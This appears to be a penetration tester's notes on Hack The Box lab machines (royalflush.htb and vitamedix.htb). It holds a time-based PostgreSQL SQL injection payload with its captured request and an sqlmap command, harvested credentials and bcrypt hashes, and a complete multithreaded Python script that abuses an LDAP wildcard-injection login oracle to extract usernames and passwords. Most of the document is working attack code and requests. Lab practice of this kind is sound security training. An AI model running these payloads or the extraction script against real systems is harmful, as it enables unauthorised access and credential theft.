# ROYAL FLUSH

### WWW.royalflush.htb.com

## SQLI AT https://www.royalflush.htb/forgot
payload `asd%40me.c'||+(SELECT+pg_sleep(10)::text)||'`

tables:
| users    |
| user_roles |
| forgot  |
| roles  


### Request 
```POST /forgot HTTP/1.1
Host: www.royalflush.htb
Cookie: session=eyJjc3JmX3Rva2VuIjoiOWM3NWFjZmMxNWMxZDgyNjAxNTk2Y2YxY2FjNDczODk3N2ExZDQ2YSJ9.anbeug.j36tmt5PANRFiIG2D62bEhlbUbo
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 153
Origin: https://www.royalflush.htb
Referer: https://www.royalflush.htb/forgot
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

email=asd%40me.c'||+(SELECT+pg_sleep(10)::text)||'&csrf_token=IjljNzVhY2ZjMTVjMWQ4MjYwMTU5NmNmMWNhYzQ3Mzg5NzdhMWQ0NmEi.anbewQ.zb1KnWGEDBsZOMxVhX87RuuN-fo
```

SQLMAP command 
`sqlmap -r sql.txt --level=5 --risk=3 -D public --tables --dbms=postgres --technique=T --proxy="http://127.0.0.1:8080" --force-ssl --tamper=nosemi.py
`


### forum.royalflush.htb
charles:charles

![[Screenshot from 2026-08-08 15-06-48.png]]


# vitamedix.htb

## Gathered INFO 
Emails: 
admin@vitamedix.htb
username:
admin:$2a$10$Z3ahuIDRzvgU7C5gz5gi9OGBoeZxOtzfmwTndnDoGyv0DwTz40pEa
henry: $2a$12$GCqpIpNXu4tGWXTm8b1XouoTxIJbZsqZNyozw4WAHDExZqj5SVM6e

superadmin1337
htb-stdnt



username found via ldap in 
`ldap.vitamedix.htb`

```  
  
import requests  
import string  
from concurrent.futures import ThreadPoolExecutor, as_completed  
  
# ----------------------- CONFIG -----------------------  
BASE_URL   = "http://ldap.vitamedix.htb"  
LOGIN_URL  = f"{BASE_URL}/index.php"  
  
STATIC_PHPSESSID = "5buiqolv6gn4uoqccp3fuqiv4s"  # from your captured request  
  
HEADERS = {  
    "Host": "ldap.vitamedix.htb",  
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0",  
    "Accept": "*/*",  
    "Accept-Language": "en-US,en;q=0.9",  
    "Accept-Encoding": "gzip, deflate, br",  
    "Content-Type": "application/x-www-form-urlencoded",  
    "Origin": BASE_URL,  
    "Referer": LOGIN_URL,  
    "Upgrade-Insecure-Requests": "1",  
    "Priority": "u=0, i",  
    "Connection": "keep-alive",  
}  
  
USERNAME_CHARSET = string.ascii_lowercase + string.digits + "_-."  
# Full printable ASCII (32 space .. 126 ~) so we brute every letter/digit/  
# symbol/shape possible, not just a guessed subset.  
PASSWORD_CHARSET = "".join(chr(i) for i in range(32, 127))  
  
# LDAP filter metacharacters that MUST be escaped (RFC 4515) whenever they  
# appear as literal data inside a filter value, or the server will parse  
# them as filter syntax instead of literal characters -- this would silently  
# corrupt prefix matching the moment a real password contains one of these.  
_LDAP_ESCAPES = {  
    "\\": "\\5c",  
    "*":  "\\2a",  
    "(":  "\\28",  
    ")":  "\\29",  
    "\x00": "\\00",  
}  
  
  
def ldap_escape(s: str) -> str:  
    return "".join(_LDAP_ESCAPES.get(ch, ch) for ch in s)  
  
KNOWN_FIRST_LETTERS = ["s", "h"]   # from what you already know  
MAX_LEN = 40                        # safety cap on extraction length  
THREADS = 20  
# --------------------------------------------------------  
  
session = requests.Session()  
session.headers.update(HEADERS)  
session.cookies.set("PHPSESSID", STATIC_PHPSESSID, domain="ldap.vitamedix.htb")  
_adapter = requests.adapters.HTTPAdapter(pool_connections=THREADS, pool_maxsize=THREADS)  
session.mount("http://", _adapter)  
session.mount("https://", _adapter)  
  
# filled in by calibrate()  
_success_len = None  
_failure_len = None  
_success_status = None  
_failure_status = None  
_success_location = None  
_failure_location = None  
_oracle_mode = None  # "status" | "location" | "length"  
  
  
def raw_login(username: str, password: str):  
    data = {"username": username, "password": password}  
    r = session.post(LOGIN_URL, data=data, allow_redirects=False, timeout=15)  
    return r  
  
  
def calibrate():  
    """  
    User has confirmed: HTTP 302 = successful login, HTTP 200 = failed login.    Still fires both requests once, just to print evidence and catch anything    unexpected (e.g. a WAF block) before running the full extraction.    """    global _success_status, _failure_status, _oracle_mode  
  
    _success_status = 302  
    _failure_status = 200  
    _oracle_mode = "status"  
  
    print("[*] Confirming oracle (302=success, 200=fail)...")  
    r_success = raw_login("*", "*")  
    r_failure = raw_login("definitely_not_a_real_user_xyz123", "definitely_not_a_real_pw_xyz123")  
    print(f"    success attempt -> status={r_success.status_code} "  
          f"location={r_success.headers.get('Location')}")  
    print(f"    failure attempt -> status={r_failure.status_code} "  
          f"location={r_failure.headers.get('Location')}")  
  
    if r_success.status_code != 302:  
        print(f"[!] Expected 302 on the known bypass but got {r_success.status_code}. "  
              f"Check the session cookie is still valid / the payload still works.")  
    if r_failure.status_code != 200:  
        print(f"[!] Expected 200 on the bogus login but got {r_failure.status_code}. "  
              f"Oracle may not be reliable -- verify before trusting extraction results.")  
  
  
def is_success(r) -> bool:  
    return r.status_code == _success_status  
  
  
def wildcard_prefix_matches(field: str, prefix: str, other_value: str) -> bool:  
    """  
    field: 'username' or 'password'    Tests whether <prefix>* matches something, with the other field    held constant (usually '*').    `prefix` is the literal data we've extracted so far (escaped here);    the trailing '*' we append is OUR wildcard operator, left unescaped    on purpose.    """    escaped = ldap_escape(prefix) + "*"  
    if field == "username":  
        r = raw_login(escaped, other_value)  
    else:  
        r = raw_login(other_value, escaped)  
    return is_success(r)  
  
  
def exact_matches(field: str, value: str, other_value: str) -> bool:  
    """Tests an EXACT (no trailing wildcard) match. Full value is escaped."""  
    escaped = ldap_escape(value)  
    if field == "username":  
        r = raw_login(escaped, other_value)  
    else:  
        r = raw_login(other_value, escaped)  
    return is_success(r)  
  
  
def find_next_char(field: str, prefix: str, charset: str, fixed_other_value: str):  
    """  
    Tests all charset characters for this position CONCURRENTLY    (up to THREADS at a time) and returns the first one that matches,    or None if none do.    """    with ThreadPoolExecutor(max_workers=THREADS) as ex:  
        futures = {  
            ex.submit(wildcard_prefix_matches, field, prefix + c, fixed_other_value): c  
            for c in charset  
        }  
        found = None  
        for fut in as_completed(futures):  
            c = futures[fut]  
            try:  
                if fut.result():  
                    found = c  
                    break  
            except requests.exceptions.RequestException as e:  
                print(f"    [!] request error testing '{c}': {e}")  
        # let any still-running requests finish in the background; we don't  
        # need their results once we have a match        return found  
  
  
def extract_field(field: str, charset: str, fixed_other_value: str, start_prefix: str = "") -> str:  
    """  
    Generic prefix-growing extraction for either username or password.    fixed_other_value: what to send for the OTHER field while extracting    this one (e.g. '*' for password while extracting username, or the    known exact username while extracting its password).    """    prefix = start_prefix  
    for _ in range(MAX_LEN):  
        # Termination check: does the current prefix match exactly already?  
        if prefix and exact_matches(field, prefix, fixed_other_value):  
            return prefix  
  
        c = find_next_char(field, prefix, charset, fixed_other_value)  
        if c is None:  
            break  
        prefix += c  
        print(f"    [{field}] so far: {prefix}", end="\r")  
    print()  
    return prefix  
  
  
def extract_username(start_letter: str) -> str:  
    print(f"[*] Extracting username starting with '{start_letter}'...")  
    return extract_field("username", USERNAME_CHARSET, fixed_other_value="*", start_prefix=start_letter)  
  
  
def extract_password(username: str) -> str:  
    print(f"[*] Extracting password for '{username}'...")  
    return extract_field("password", PASSWORD_CHARSET, fixed_other_value=username, start_prefix="")  
  
  
def main():  
    calibrate()  
  
    print(f"[*] Extracting usernames for prefixes {KNOWN_FIRST_LETTERS} "  
          f"concurrently ({THREADS} threads per position)...")  
    usernames = []  
    with ThreadPoolExecutor(max_workers=len(KNOWN_FIRST_LETTERS)) as ex:  
        futures = {ex.submit(extract_username, letter): letter for letter in KNOWN_FIRST_LETTERS}  
        for fut in as_completed(futures):  
            letter = futures[fut]  
            uname = fut.result()  
            print(f"[+] Username found (starts with '{letter}'): {uname}")  
            usernames.append(uname)  
  
    print(f"\n[*] Extracting passwords for {usernames} concurrently...")  
    results = {}  
    with ThreadPoolExecutor(max_workers=len(usernames)) as ex:  
        futures = {ex.submit(extract_password, u): u for u in usernames}  
        for fut in as_completed(futures):  
            uname = futures[fut]  
            pwd = fut.result()  
            print(f"[+] {uname} : {pwd}")  
            results[uname] = pwd  
  
    print("\n=== Extracted credentials ===")  
    for u, p in results.items():  
        print(f" {u} : {p}")  
  
  
if __name__ == "__main__":  
    main()
```

```
=== Extracted credentials ===
 htb-stdnt : 
 superadmin1337 : 

```